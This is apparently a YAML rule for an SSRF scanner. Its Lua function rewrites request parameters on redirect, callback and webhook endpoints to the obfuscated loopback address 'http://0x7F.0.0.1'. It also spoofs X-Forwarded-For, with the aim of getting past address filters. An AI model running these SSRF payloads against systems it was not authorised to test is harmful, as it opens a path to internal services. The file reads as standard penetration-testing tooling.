# 48_ip_with_encoding_mixed.yaml
meta:
  id: encoding_mixed
  version: 2
  name: "Mixed Encoding (hex+decimal)"
  description: "Uses mixed encoding like 0x7F.0.0.1"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-07-21"
  rank: 106
  confidence: 83
  severity: high
  tags: [mixed, encoding, ipv4, bypass]
  references: []

match:
  schemes: [http, https]
  kinds: [Endpoint]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: run_batch
  source: |
    function run_batch(targets)
        local results = {}
        local payload_vector = "http://0x7F.0.0.1"  -- hex first octet, rest decimal
        
        for _, target in ipairs(targets) do
            local base_url = target.url
            
            for _, param in ipairs(target.params) do
                local new_url = base_url
                
                if param.location == "Query" then
                    local pattern = param.name .. "=[^&]*"
                    local replacement = param.name .. "=" .. payload_vector
                    if new_url:find(pattern) then
                        new_url = new_url:gsub(pattern, replacement)
                    else
                        local sep = new_url:find("%?") and "&" or "?"
                        new_url = new_url .. sep .. replacement
                    end
                end

                table.insert(results, {
                    url = new_url,
                    method = target.method or "GET",
                    headers = {
                        ["X-Forwarded-For"] = "0x7F.0.0.1",
                    },
                })
            end
        end
        return results
    end